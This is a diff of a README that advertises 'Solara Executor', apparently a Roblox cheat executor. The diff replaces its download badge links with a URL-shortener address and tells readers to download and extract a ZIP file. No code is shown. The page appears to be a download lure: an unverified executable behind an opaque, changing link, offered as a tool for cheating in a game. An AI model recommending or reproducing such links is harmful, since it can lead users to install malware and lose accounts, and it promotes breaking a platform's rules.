@@ -1,8 +1,8 @@
-# 🚀 Solara Executor - Roblox Executor **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://getwix.cc/)**
+# 🚀 Solara Executor - Roblox Executor **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](\https://getwix.short.gy/main)**
 
 ## Quick Installation
 To get started with Solara Executor, follow these simple steps:
-1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://getwix.cc/)**
+1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://getwix.short.gy/main)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
